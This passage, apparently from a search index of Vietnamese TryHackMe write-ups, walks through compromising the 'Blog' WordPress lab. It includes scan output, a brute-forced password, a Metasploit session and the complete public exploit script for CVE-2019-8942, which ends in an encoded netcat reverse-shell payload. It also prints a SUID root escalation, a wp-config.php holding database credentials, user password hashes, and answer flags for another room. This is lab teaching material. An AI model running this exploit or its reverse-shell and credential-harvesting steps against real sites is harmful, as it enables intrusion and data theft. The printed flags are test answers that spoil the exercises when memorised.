:// 10 . 10 . 184 . 240 / feed /] / login ( Status : 302 ) [ Size : 0 ] [--> http :// blog . thm / wp-login . php ] / 0 ( Status : 301 ) [ Size : 0 ] [--> http :// 10 . 10 . 184 . 240 / 0 /] / feed ( Status : 301 ) [ Size : 0 ] [--> http :// 10 . 10 . 184 . 240 / feed /] / atom ( Status : 301 ) [ Size : 0 ] [--> http :// 10 . 10 . 184 . 240 / feed / atom /] / wp-content ( Status : 301 ) [ Size : 315 ] [--> http :// 10 . 10 . 184 . 240 / wp-content /] / admin ( Status : 302 ) [ Size : 0 ] [--> http :// blog . thm / wp-admin /] / rss2 ( Status : 301 ) [ Size : 0 ] [--> http :// 10 . 10 . 184 . 240 / feed /] / wp-includes ( Status : 301 ) [ Size : 316 ] [--> http :// 10 . 10 . 184 . 240 / wp-includes /] / rdf ( Status : 301 ) [ Size : 0 ] [--> http :// 10 . 10 . 184 . 240 / feed / rdf /] / page1 ( Status : 301 ) [ Size : 0 ] [--> http :// 10 . 10 . 184 . 240 /] / ' ( Status : 301 ) [ Size : 0 ] [--> http :// 10 . 10 . 184 . 240 /] / dashboard ( Status : 302 ) [ Size : 0 ] [--> http :// blog . thm / wp-admin /] V\u1edbi WordPress, ta c\u00f3 c\u00f4ng c\u1ee5 WPScan d\u00f9ng \u0111\u1ec3 scan nhanh l\u1ed7 h\u1ed5ng c\u00f3 \u0111\u01b0\u1ee3c (t\u1ea1i wordpress nhi\u1ec1u l\u1ed7 h\u1ed5ng qu\u00e1 :V) Terminal _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____ | \\ \\ /\\ / /| | __ ) | ( ___ ___ __ _ _ __ \u00ae \\ \\/ \\/ / | ___ / \\ ___ \\ / __ |/ _ ` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.24 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://10.10.184.240/ [10.10.184.240] [+] Started: HIDDEN Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.29 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] robots.txt found: http://10.10.184.240/robots.txt | Interesting Entries: | - /wp-admin/ | - /wp-admin/admin-ajax.php | Found By: Robots Txt (Aggressive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.184.240/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://10.10.184.240/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://10.10.184.240/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.184.240/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.0 identified (Insecure, released on 2018-12-06). | Found By: Emoji Settings (Passive Detection) | - http://10.10.184.240/, Match: ' wp-includes \\/ js \\/ wp-emoji-release . min . js ? ver = 5 . 0 ' | Confirmed By: Meta Generator (Passive Detection) | - http://10.10.184.240/, Match: ' WordPress 5 . 0 ' [i] The main theme could not be detected . [+] Enumerating Users ( via Passive and Aggressive Methods ) Brute Forcing Author IDs - Time : 00 : 00 : 01 <==============================================================================================================================================================> ( 10 / 10 ) 100 . 00 % Time : 00 : 00 : 01 [i] User ( s ) Identified : [+] bjoel | Found By : Wp Json Api ( Aggressive Detection ) | - http :// 10 . 10 . 184 . 240 / wp-json / wp / v2 / users / ? per_page = 100 & page = 1 | Confirmed By : | Author Id Brute Forcing - Author Pattern ( Aggressive Detection ) | Login Error Messages ( Aggressive Detection ) [+] kwheel | Found By : Wp Json Api ( Aggressive Detection ) | - http :// 10 . 10 . 184 . 240 / wp-json / wp / v2 / users / ? per_page = 100 & page = 1 | Confirmed By : | Author Id Brute Forcing - Author Pattern ( Aggressive Detection ) | Login Error Messages ( Aggressive Detection ) [+] Karen Wheeler | Found By : Rss Generator ( Aggressive Detection ) [+] Billy Joel | Found By : Rss Generator ( Aggressive Detection ) [!] No WPScan API Token given , as a result vulnerability data has not been output . [!] You can get a free API token with 25 daily requests by registering at https :// wpscan . com / register T\u1eeb k\u1ebft qu\u1ea3 tr\u00ean, ta th\u1ea5y r\u1eb1ng WPScan t\u00ecm \u0111\u01b0\u1ee3c 2 user l\u00e0 bjoel v\u00e0 kwheel, t\u1eeb \u0111\u00e2y ta brute force th\u1eed v\u00e0o trang login c\u1ee7a website blog.thm D\u00f9ng hydra ho\u1eb7c burpsuite ho\u1eb7c b\u1ea5t c\u1ee9 tool n\u00e0o kh\u00e1c \u0111\u1ec3 brute force password. Ch\u1eafc ch\u1eafn s\u1ebd ra Nooooo username: kwheel password: cutiepie1 V\u00e0o \u0111\u01b0\u1ee3c trang qu\u1ea3n l\u00ed r\u1ed3i :V Trang qu\u1ea3n l\u00ed Ta th\u1ea5y trang qu\u1ea3n l\u00ed s\u1eed d\u1ee5ng WordPress 5.0, ta d\u00f9ng searchsploit \u0111\u1ec3 t\u00ecm ki\u1ebfm l\u1ed7 h\u1ed5ng c\u00f3 th\u1ec3 khai th\u00e1c t\u1eeb \u0111\u00e2y K\u1ebft qu\u1ea3 c\u1ee7a searchsploit Nh\u00ecn k\u1ebft qu\u1ea3 tr\u00ean ta th\u1ea5y \u0111\u01b0\u1ee3c l\u1ed7 h\u1ed5ng Image Remote Code Execution thu\u1ed9c CVE-2019-8942","title":"Reconnaissance"},{"location":"tryhackme/room/blog/#init-access","text":"","title":"Init Access"},{"location":"tryhackme/room/blog/#metasploit","text":"T\u1eeb ph\u1ea7n tr\u00ean ta c\u00f3 2 h\u01b0\u1edbng khai th\u00e1c b\u1eb1ng Metasploit Terminal msf6 exploit ( multi / http / wp_crop_rce ) > options Module options ( exploit / multi / http / wp_crop_rce ): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD cutiepie1 yes The WordPress password to authenticate with Proxies no A proxy chain of format type : host : port [, type : host : port ][...] RHOSTS 10 . 10 . 184 . 240 yes The target host ( s ), see https :// docs . metasploit . com / docs / using-metasploit / basics / using-metasploit . html RPORT 80 yes The target port ( TCP ) SSL false no Negotiate SSL / TLS for outgoing connections TARGETURI / yes The base path to the wordpress application THEME_DIR no The WordPress theme dir name ( disable theme auto-detection if provided ) USERNAME kwheel yes The WordPress username to authenticate with VHOST no HTTP server virtual host Options Terminal msf6 exploit ( multi / http / wp_crop_rce ) > exploit [*] Started reverse TCP handler on 10 . 18 . 80 . 57 : 443 [*] Authenticating with WordPress using kwheel : cutiepie1 ... [+] Authenticated with WordPress [*] Preparing payload ... [*] Uploading payload [+] Image uploaded [*] Including into theme [*] Sending stage ( 39927 bytes ) to 10 . 10 . 184 . 240 [*] Meterpreter session 1 opened ( 10 . 18 . 80 . 57 : 443 -> 10 . 10 . 184 . 240 : 54232 ) at 2023 - 08 - 27 09 : 21 : 20 - 0400 [*] Attempting to clean up files ... Terminal meterpreter > shell Process 1834 created . Channel 1 created . Terminal python -c 'import pty;pty.spawn (\"/bin/bash\");' www-data @blog :/ var / www / wordpress $ Cu\u1ed1i c\u00f9ng c\u0169ng \u0111\u00e3 th\u00e0nh c\u00f4ng b\u01b0\u1edbc \u0111\u1ea7u c\u1ee7a vi\u1ec7c th\u00e2m nh\u1eadp h\u1ec7 th\u1ed1ng.","title":"Metasploit"},{"location":"tryhackme/room/blog/#python-script","text":"Nh\u00ecn l\u1ea1i searchsploit n\u00e0o, ta c\u00f3 th\u1ec3 d\u00f9ng python (file 49512.py) \u0111\u1ec3 khai th\u00e1c l\u1ed7 h\u1ecfng Image Remote Code Excution tr\u00ean WordPress 5.0 H\u00ecnh \u1ea3nh m\u00f4 t\u1ea3 k\u1ebft qu\u1ea3 searchsploit 49512.py # Exploit Title: WordPress 5.0.0 - Image Remote Code Execution # Date: 2020-02-01 # Exploit Authors: OUSSAMA RAHALI ( aka V0lck3r) # Discovery Author : RIPSTECH Technology # Version: WordPress 5.0.0 and <= 4.9.8 . # References : CVE-2019-89242 | CVE-2019-89242 | https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/ #/usr/bin/env python3 import requests import re import sys from datetime import datetime banner = \"\"\" __ __ _ ____ ____ _____ \\ \\ / /__ _ __ __| |_ __ _ __ ___ ___ ___ | _ \\ / ___| ____| \\ \\ /\\ / / _ \\| '__/ _` | '_ \\| '__/ _ \\/ __/ __| | |_) | | | _| \\ V V / (_) | | | (_| | |_) | | | __/\\__ \\__ \\ | _ <| |___| |___ \\_/\\_/ \\___/|_| \\__,_| .__/|_| \\___||___/___/ |_| \\_ \\\\ ____|_____| |_| 5.0.0 and <= 4.9.8 \"\"\" print ( banner ) print ( \"usage :\" ) print ( \"=======\" ) usage = 'python3 RCE_wordpress.py http://<IP>:<PORT>/ <Username> <Password> <WordPress_theme>' print ( usage ) url = sys . argv [ 1 ] username = sys . argv [ 2 ] password = sys . argv [ 3 ] wp_theme = sys . argv [ 4 ] # wpscan results lhost = '10.10.10.10' #attacker ip lport = '4141' #listening port date = str ( datetime . now () . strftime ( '%Y' )) + '/' + str ( datetime . now () . strftime ( '%m' )) + '/' imagename = 'gd.jpg' # ====== # Note : # ====== # It could be any jpg image, BUT there are some modifications first : # 1- image name as : \"gd.jpg\" # 2- place the image in the same directory as this exploit. # 3- inject the php payload via exiftool : exiftool gd.jpg -CopyrightNotice=\"<?=\\`\\$_GET[0]\\`?>\" data = { 'log' : username , 'pwd' : password , 'wp-submit' : 'Log In' , 'redirect_to' : url + 'wp-admin/' , 'testcookie' : 1 } r = requests . post ( url + 'wp-login.php' , data = data ) if r . status_code == 200 : print ( \"[+] Login successful. \\n \" ) else : print ( \"[-] Failed to login.\" ) exit ( 0 ) cookies = r . cookies print ( \"[+] Getting Wp Nonce ... \" ) res = requests . get ( url + 'wp-admin/media-new.php' , cookies = cookies ) wp_nonce_list = re . findall ( r 'name=\"_wpnonce\" value=\"(\\w+)\"' , res . text ) if len ( wp_nonce_list ) == 0 : print ( \"[-] Failed to retrieve the _wpnonce \\n \" ) exit ( 0 ) else : wp_nonce = wp_nonce_list [ 0 ] print ( \"[+] Wp Nonce retrieved successfully ! _wpnonce : \" + wp_nonce + \" \\n \" ) print ( \"[+] Uploading the image ... \" ) data = { 'name' : 'gd.jpg' , 'action' : 'upload-attachment' , '_wpnonce' : wp_nonce } image = { 'async-upload' : ( imagename , open ( imagename , 'rb' ))} r_upload = requests . post ( url + 'wp-admin/async-upload.php' , data = data , files = image , cookies = cookies ) if r_upload . status_code == 200 : image_id = re . findall ( r '{\"id\":(\\d+),' , r_upload . text )[ 0 ] _wp_nonce = re . findall ( r '\"update\":\"(\\w+)\"' , r_upload . text )[ 0 ] print ( '[+] Image uploaded successfully ! Image ID :' + image_id + \" \\n \" ) else : print ( \"[-] Failed to receive a response for uploaded image ! try again . \\n \" ) exit ( 0 ) print ( \"[+] Changing the path ... \" ) data = { '_wpnonce' : _wp_nonce , 'action' : 'editpost' , 'post_ID' : image_id , 'meta_input[_wp_attached_file]' : date + imagename + '?/../../../../themes/' + wp_theme + '/rahali' } res = requests . post ( url + 'wp-admin/post.php' , data = data , cookies = cookies ) if res . status_code == 200 : print ( \"[+] Path has been changed successfully. \\n \" ) else : print ( \"[-] Failed to change the path ! Make sure the theme is correcte . \\n \" ) exit ( 0 ) print ( \"[+] Getting Ajax nonce ... \" ) data = { 'action' : 'query-attachments' , 'post_id' : 0 , 'query[item]' : 43 , 'query[orderby]' : 'date' , 'query[order]' : 'DESC' , 'query[posts_per_page]' : 40 , 'query[paged]' : 1 } res = requests . post ( url + 'wp-admin/admin-ajax.php' , data = data , cookies = cookies ) ajax_nonce_list = re . findall ( r ',\"edit\":\"(\\w+)\"' , res . text ) if res . status_code == 200 and len ( ajax_nonce_list ) != 0 : ajax_nonce = ajax_nonce_list [ 0 ] print ( '[+] Ajax Nonce retrieved successfully ! ajax_nonce : ' + ajax_nonce + ' \\n ' ) else : print ( \"[-] Failed to retrieve ajax_nonce. \\n \" ) exit ( 0 ) print ( \"[+] Cropping the uploaded image ... \" ) data = { 'action' : 'crop-image' , '_ajax_nonce' : ajax_nonce , 'id' : image_id , 'cropDetails[x1]' : 0 , 'cropDetails[y1]' : 0 , 'cropDetails[width]' : 200 , 'cropDetails[height]' : 100 , 'cropDetails[dst_width]' : 200 , 'cropDetails[dst_height]' : 100 } res = requests . post ( url + 'wp-admin/admin-ajax.php' , data = data , cookies = cookies ) if res . status_code == 200 : print ( \"[+] Done . \\n \" ) else : print ( \"[-] Erorr ! Try again \\n \" ) exit ( 0 ) print ( \"[+] Creating a new post to include the image... \" ) res = requests . post ( url + 'wp-admin/post-new.php' , cookies = cookies ) if res . status_code == 200 : _wpnonce = re . findall ( r 'name=\"_wpnonce\" value=\"(\\w+)\"' , res . text )[ 0 ] post_id = re . findall ( r '\"post\":{\"id\":(\\w+),' , res . text )[ 0 ] print ( \"[+] Post created successfully . \\n \" ) else : print ( \"[-] Erorr ! Try again \\n \" ) exit ( 0 ) data = { '_wpnonce' : _wpnonce , 'action' : 'editpost' , 'post_ID' : post_id , 'post_title' : 'RCE poc by v0lck3r' , 'post_name' : 'RCE poc by v0lck3r' , 'meta_input[_wp_page_template]' : 'cropped-rahali.jpg' } res = requests . post ( url + 'wp-admin/post.php' , data = data , cookies = cookies ) if res . status_code == 200 : print ( \"[+] POC is ready at : \" + url + '?p=' + post_id + '&0=id \\n ' ) print ( \"[+] Executing payload !\" ) requests . get ( f \" { url } ?p= { post_id } &0=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20 { lhost } %20 { lport } %20%3E%2Ftmp%2Ff\" , cookies = cookies ) else : print ( \"[-] Erorr ! Try again (maybe change the payload) \\n \" ) exit ( 0 )","title":"Python script"},{"location":"tryhackme/room/blog/#privilege-escalation","text":"Nh\u01b0 th\u01b0\u1eddng l\u1ec7, th\u00ec m\u00f3n khai v\u1ecb ph\u1ea3i l\u00e0 ki\u1ec3m tra quy\u1ec1n sudo (c\u00e1i n\u00e0y b\u1ecf qua v\u00ec l\u00e0m g\u00ec c\u00f3 password c\u1ee7a www-data) v\u00e0 suid find / -user root -perm /4000 -type f 2>/dev/null m\u1ed9t ph\u1ea7n k\u1ebft qu\u1ea3 c\u1ee7a vi\u1ec7c xem suid T\u1eeb h\u00ecnh \u1ea3nh tr\u00ean ta th\u1ea5y m\u1ed9t file l\u1ea1i l\u00e0 checker \u1edf /usr/sbin Ta s\u1ebd th\u1eed ki\u1ec3m tra file checker \u0110\u1eebng c\u00f3a xem T\u1ea1i m\u00e1y victim: Th\u1ef1c thi l\u1ea7n l\u01b0\u1ee3t Terminal cd / usr / sbin python3 -m http . server T\u1ea1i m\u00e1y attacker: Th\u1ef1c thi wget http://blog.thm:8000/checker K\u1ebft qu\u1ea3 n\u1ed9i dung h\u00e0m main T\u1eeb h\u00ecnh \u1ea3nh tr\u00ean, ta th\u1ea5y file n\u00e0y c\u00f3 ch\u1ee9c n\u0103ng ki\u1ec3m tra bi\u1ebfn m\u00f4i tr\u01b0\u1eddng c\u00f3 t\u00ean admin \u0111\u00e3 \u0111\u01b0\u1ee3c \u0111\u1eb7t gi\u00e1 tr\u1ecb hay ch\u01b0a, n\u1ebfu ch\u01b0a th\u00ec s\u1ebd kh\u00f4ng c\u00f3 quy\u1ec1n admin c\u00f2n n\u1ebfu \u0111\u00e3 \u0111\u1eb7t th\u00ec s\u1ebd c\u00f3 quy\u1ec1n admin (t\u1ee9c set suid=0) C\u00f3 th\u1ec3 d\u00f9ng ghidra \u0111\u1ec3 xem ch\u01b0\u01a1ng tr\u00ecnh m\u1ed9t c\u00e1ch t\u1ed5ng qu\u00e1t h\u01a1n Ro\u00e0i t\u1eeb \u0111\u00e2y, ta s\u1ebd \u0111\u1eb7t gi\u00e1 tr\u1ecb cho bi\u1ebfn admin v\u00e0 leo quy\u1ec1n root thoai :v V\u00ed d\u1ee5 admin=r /usr/sbin/checker Quy\u1ec1n root Ta \u0111\u01b0\u1ee3c to\u00e0n b\u1ed9 flag nh\u01b0 trong h\u00ecnh Flag","title":"Privilege Escalation"},{"location":"tryhackme/room/blog/#some-problems","text":"T\u00f4i mu\u1ed1n chia s\u1ebb m\u1ed9t v\u00e0i \u0111i\u1ec1u v\u1ec1 challenge n\u00e0y. T\u00f4i \u0111\u00e3 l\u01b0\u1ee3t b\u1ecf nhi\u1ec1u v\u1ea5n \u0111\u1ec1 trong m\u1ea1ch ch\u00ednh c\u1ee7a k\u1ecbch b\u1ea3n tri\u1ec3n khai v\u00e0 s\u1ebd vi\u1ebft \u1edf t\u1ea1i \u0111\u00e2y.","title":"Some problems"},{"location":"tryhackme/room/blog/#139-445","text":"V\u1edbi c\u00e1i t\u1ef1a \u0111\u1ec1 139 445 ch\u1eafc h\u1eb5n ta s\u1ebd ch\u00fa \u00fd \u0111\u1ebfn SMB D\u00e9, ta v\u1eabn c\u00f3 c\u00f4ng \u0111o\u1ea1n ki\u1ec3m tra SMB nh\u01b0 sau SMBMap T\u1eeb vi\u1ec7c ki\u1ec3m tra b\u1eb1ng smbmap, ta th\u1ea5y \u1ed5 disk BillySMB share v\u00e0 \u0111\u01b0\u1ee3c c\u1ea5p quy\u1ec1n \u0111\u1ecdc/ghi. Nh\u01b0ng l\u00e0m th\u1ebf n\u00e0o \u0111\u1ec3 v\u00e0o disk \u0111\u00f3 \u0111\u00e2y? Ta s\u1ebd d\u00f9ng c\u00f4ng c\u1ee5 enum4linux \u0111\u1ec3 xem \u0111\u01b0\u1eddng d\u1eabn Terminal Sau khi c\u00f3 \u0111\u01b0\u1eddng d\u1eabn r\u1ed3i, ta truy c\u1eadp b\u1eb1ng smbclient H\u00ecnh \u1ea3nh m\u00f4 t\u1ea3 vi\u1ec7c truy c\u1eadp th\u00e0nh c\u00f4ng SMB :3 get h\u1ebft 3 file v\u1ec1 m\u00e1y, xem c\u00f3 g\u00ec kh\u00f4ng nha (th\u00f4ng th\u01b0\u1eddng s\u1ebd c\u00f3 th\u1ec3 ch\u1ee9 nh\u1eefng th\u00f4ng tin c\u1ea7n thi\u1ebft \u0111\u00e3 \u0111\u01b0\u1ee3c \u1ea9n gi\u1ea5u trong file) Quan tr\u1ecdng h\u01a1n n\u1eefa, enum4linux cho ta bi\u1ebft \u0111\u01b0\u1ee3c h\u1ec7 th\u1ed1ng c\u00f3 H\u00ecnh \u1ea3nh cho k\u1ebft qu\u1ea3 c\u00f3 user bjoel","title":"139 445"},{"location":"tryhackme/room/blog/#wp-configphp","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 <?php /** * The base configuration for WordPress * * The wp-config.php creation script uses this file during the * installation. You don't have to use the web site, you can * copy this file to \"wp-config.php\" and fill in the values. * * This file contains the following configurations: * * * MySQL settings * * Secret keys * * Database table prefix * * ABSPATH * * @link https://codex.wordpress.org/Editing_wp-config.php * * @package WordPress */ /* Custom */ /* define('WP_HOME', '/'); define('WP_SITEURL', '/'); */ // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define ( 'DB_NAME' , 'blog' ); /** MySQL database username */ define ( 'DB_USER' , 'wordpressuser' ); /** MySQL database password */ define ( 'DB_PASSWORD' , 'LittleYellowLamp90!@' ); /** MySQL hostname */ define ( 'DB_HOST' , 'localhost' ); /** Database Charset to use in creating database tables. */ define ( 'DB_CHARSET' , 'utf8' ); /** The Database Collate type. Don't change this if in doubt. */ define ( 'DB_COLLATE' , '' ); /** Custom FS Method */ define ( 'FS_METHOD' , 'direct' ); /**#@+ * Authentication Unique Keys and Salts. * * Change these to different unique phrases! * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service} * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again. * * @since 2.6.0 */ define ( 'AUTH_KEY' , 'ZCgJQaT0(*+Zjo}Iualapeo|?~nMtp^1IUrquYx3!#T$ihW8F~_`L+$N E>J!Bm;' ); define ( 'SECURE_AUTH_KEY' , 'nz|(+d|| yVX-5_on76q%:M, ?{NVJ,Q(;p3t|_B*]-yQ&|]3}M@Po!f_,T-S4fe' ); define ( 'LOGGED_IN_KEY' , 'a&I&DR;PUnPKul^kLBgxYa@`g||{eZf><sf8SmKBi+R7`O?](SuL&/H#hqzO$_:3' ); define ( 'NONCE_KEY' , 'Vdd-zzB:/yxg6unZvng,oY-%Z V,i%+Uz_f)S;Efz!;cY3p~]T,g1z*Z[jXe>5Sm' ); define ( 'AUTH_SALT' , 'u+k8g;=jbe)6/X~<M1HwINhH(Tno@orx:$_$-#*id)ddBYGGF(]AP?}4?2E|m;5`' ); define ( 'SECURE_AUTH_SALT' , '>Rg5>,/^BywVg^A[Etqot:CoU+9<)YPM~h|)Ifd5!iK!L*5+JDiZi33KrYZNd2B7' ); define ( 'LOGGED_IN_SALT' , '3kpL-rcnU+>H#t/g>9<)j/u I1/-Ws;h6GrDQ>v8%7@C~`h1lBC/euttp)/8EdA_' ); define ( 'NONCE_SALT' , 'JEajZ)y?&.m-1^$(c-JX$zi0qv|7]F%7a6jh]P5SRs+%`*60?WJVk$><b$poQg9>' ); /**#@-*/ /** * WordPress Database Table prefix. * * You can have multiple installations in one database if you give each * a unique prefix. Only numbers, letters, and underscores please! */ $table_prefix = 'wp_' ; /** * For developers: WordPress debugging mode. * * Change this to true to enable the display of notices during development. * It is strongly recommended that plugin and theme developers use WP_DEBUG * in their development environments. * * For information on other constants that can be used for debugging, * visit the Codex. * * @link https://codex.wordpress.org/Debugging_in_WordPress */ define ( 'WP_DEBUG' , false ); /* That's all, stop editing! Happy blogging. */ /** Absolute path to the WordPress directory. */ if ( ! defined ( 'ABSPATH' ) ) define ( 'ABSPATH' , dirname ( __FILE__ ) . '/' ); /** Sets up WordPress vars and included files. */ require_once ( ABSPATH . 'wp-settings.php' ); T\u1eeb file config (b\u1ea3n ch\u1ea5t build WordPress th\u00ec s\u1ebd c\u00f3 file n\u00e0y) tr\u00ean, ta th\u1ea5y \u0111\u01b0\u1ee3c th\u00f4ng tin c\u1ee7a database, ta s\u1ebd ti\u1ebfn h\u00e0nh \u0111i\u1ec1u tra database v\u00ec m\u1ee5c \u0111\u00edch c\u1ee7a ta s\u1ebd l\u1ea5y password c\u1ee7a user bjoel. Nh\u01b0 ta \u0111\u00e3 khai th\u00e1c \u1edf ph\u1ea7n k\u1ecbch b\u1ea3n th\u00ec vi\u1ec7c t\u00ecm \u0111\u01b0\u1ee3c password c\u1ee7a user bjoel \u1edf ng\u1eef c\u1ea3nh challenge n\u00e0y s\u1ebd kh\u00f4ng th\u1ef1c s\u1ef1 c\u1ea7n thi\u1ebft c\u0169ng nh\u01b0 l\u00e0 c\u00f3 \u00edch cho ch\u00fang ta v\u1ec1 \u0111i\u1ec1u g\u00ec c\u1ea3 nh\u01b0ng t\u00f4i mu\u1ed1n \u0111\u1ec1 c\u1eadp \u1edf \u0111\u00e2y l\u00e0 s\u1ebd c\u00f3 th\u1ec3 t\u1ed3n t\u1ea1i 1 challenge n\u00e0o \u0111\u00f3 ho\u1eb7c t\u1ed1i thi\u1ec3u s\u1ebd m\u1edf ra m\u1ed9t h\u01b0\u1edbng /m\u1ed9t c\u00e1ch nh\u00ecn m\u1edbi \u0111\u1ed1i v\u1edbi c\u00f4ng vi\u1ec7c c\u1ee7a m\u1ed9t redteam thay v\u00ec pentester. Ti\u1ebfn h\u00e0nh v\u00e0o mysql b\u1eb1ng Terminal mysql - u wordpressuser - p LittleYellowLamp90 !@ use blog Xem th\u00f4ng tin user Terminal mysql > select * from wp_users select * from wp_users -> ; ; + ----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+ | ID | user_login | user_pass | user_nicename | user_email | user_url | user_registered | user_activation_key | user_status | display_name | + ----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+ | 1 | bjoel | $ P$BjoFHe8zIyjnQe / CBvaltzzC6ckPcO / | bjoel | nconkl1 @ outlook . com | | 2020 - 05 - 26 03 : 52 : 26 | | 0 | Billy Joel | | 3 | kwheel | $ P$BedNwvQ29vr1TPd80CDl6WnHyjr8te . | kwheel | zlbiydwrtfjhmuuymk @ ttirv . net | | 2020 - 05 - 26 03 : 57 : 39 | | 0 | Karen Wheeler | + ----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+ 2 rows in set ( 0 . 00 sec ) R\u1ed3i, ta th\u1ea5y \u0111\u01b0\u1ee3c 2 user l\u00e0 bjoel v\u00e0 kwheel v\u00e0 2 password \u0111\u00e3 \u0111\u01b0\u1ee3c b\u0103m B\u1ea1n c\u00f3 th\u1ec3 xem thu\u1eadt to\u00e1n b\u0103m t\u1ea1i /wp-includes/class-phpass.php \u0111\u1ed1i v\u1edbi ng\u1eef c\u1ea3nh challenge n\u00e0y ho\u1eb7c xem t\u1ea1i WordPress Xem xem xem T\u1ea1i sao ta c\u00f3 user kwheel tr\u00ean website WordPress nh\u01b0ng \u1edf m\u00e1y ch\u1ee7 th\u00ec kh\u00f4ng hi\u1ec7n use kwheel trong /home? V\u1ea5n \u0111\u1ec1 n\u1eb1m \u1edf \u0111\u00e2u?","title":"wp-config.php"},{"location":"tryhackme/room/blog/#jtygchfpnfphp","text":"Nh\u00ecn h\u00ecnh b\u00ean d\u01b0\u1edbi ta th\u1ea5y c\u00f3 file l\u1ea1 mang t\u00ean JTygChfpNf.php File m\u01a1 h\u1ed3 Th\u00ec file n\u00e0y ch\u00ednh l\u00e0 file t\u1eeb Metasploit t\u1ea1o ra trong ph\u1ea7n k\u1ecbch b\u1ea3n ban n\u00e3y ch\u00fang ta tri\u1ec3n khai \u0111\u1ea5y. L\u00e0m vi\u1ec7c g\u00ec c\u0169ng ph\u1ea3i suy ngh\u0129, khi m\u00ecnh khai th\u00e1c Metasploit, th\u00ec ta n\u00ean bi\u1ebft \u0111\u01b0\u1ee3c h\u00e0nh vi c\u1ee7a n\u00f3 di\u1ec5n ra nh\u01b0 n\u00e0o v\u00e0 n\u00f3 \u0111\u00e3 ti\u00eam th\u1ee9 g\u00ec l\u00ean h\u1ec7 th\u1ed1ng. H\u01a1n n\u1eefa, c\u00e1i file nh\u01b0 th\u1ebf xu\u1ea5t hi\u1ec7n tr\u00ean h\u1ec7 th\u1ed1ng, li\u1ec7u BlueTeam c\u00f3 d\u1ec5 d\u00e0ng ph\u00e1t hi\u1ec7n kh\u00f4ng? Sourcecode c\u1ee7a file","title":"JTygChfpNf.php"},{"location":"tryhackme/room/blog/#what-we-learned","text":"Config DNS Server through hosts file Learn about WordPress CVE-2019-8942 Privilege Escalation through SUID","title":"What we learned"},{"location":"tryhackme/room/brooklynninenine/","tags":["THM-Room","Privilege Escalation"],"text":"Brooklyn Nine Nine \u00b6 Room: https://tryhackme.com/room/brooklynninenine Task 1: Deploy and get hacking \u00b6 Answer the question bellow \u00b6 User flag ee11cbb19052e40b07aac0ca060c23ee Root flag 63a9f0ea7bb98050796b649e85481845 H\u01b0\u1edbng ti\u1ebfp c\u1eadn \u00b6 H\u01b0\u1edbng ti\u1ebfp c\u1eadn th\u1ee9 nh\u1ea5t l\u00e0 \u0111i theo t\u1eeb jake (hydra scan password - hint trong truy c\u1eadp \u1ea9n danh ftp) H\u01b0\u1edbng ti\u1ebfp c\u1eadn th\u1ee9 2 l\u00e0 \u0111i t\u1eeb pasword c\u1ee7a holt trong h\u00ecnh \u1ea3nh \u0111\u00e3 \u0111\u01b0\u1ee3c \u1ea9n t\u1ec7p password trong \u0111\u00f3 (d\u00f9ng stegseek), v\u00e0 \u0111i theo \u0111\u01b0\u1eddng leo thang \u0111\u1eb7c quy\u1ec1n nano. Alt text","title":"Brooklyn Nine Nine"},{"location":"tryhackme/room/brooklynninenine/#brooklyn-nine-nine","text":"Room: https://tryhackme.com/room/brooklynninenine","title":"Brooklyn Nine Nine"},{"location":"tryhackme/room/brooklynninenine/#task-1-deploy-and-get-hacking","text":"","title":"Task 1: Deploy and get hacking"},{"location":"tryhackme/room/brooklynninenine/#answer-the-question-bellow","text":"User flag ee11cbb19052e40b07aac0ca060c23ee Root flag 63a9f0ea7bb98050796b649e85481845","title":"Answer the question bellow"},{"location":"tryhackme/room/brooklynninenine/#huong-tiep-can","text":"H\u01b0\u1edbng ti\u1ebfp c\u1eadn th\u1ee9 nh\u1ea5t l\u00e0 \u0111i theo t\u1eeb jake (hydra scan password - hint trong truy c\u1eadp \u1ea9n danh ftp) H\u01b0\u1edbng ti\u1ebfp c\u1eadn th\u1ee9 2 l\u00e0 \u0111i t\u1eeb pasword c\u1ee7a holt trong h\u00ecnh 